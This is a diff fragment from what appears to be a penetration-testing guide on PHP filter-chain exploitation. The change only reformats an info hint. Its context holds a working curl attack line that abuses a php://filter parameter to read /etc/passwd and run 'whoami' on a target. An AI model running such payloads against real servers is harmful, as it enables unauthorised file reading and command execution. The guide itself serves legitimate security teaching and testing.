@@ -297,9 +297,7 @@ FILE="/etc/passwd"
 curl --user-agent "PENTEST" "$URL?parameter=php://filter/$FILTERS/resource=$FILE&cmd=whoami"
 ```
 
-{% hint style="info" %}
-Finding a valid path to a file on the target is not required. PHP wrappers like `php://temp` can be used instead.
-{% endhint %}
+{% hint style="info" %}Finding a valid path to a file on the target is not required. PHP wrappers like `php://temp` can be used instead.{% endhint %}
 
 {% endcode %}
 
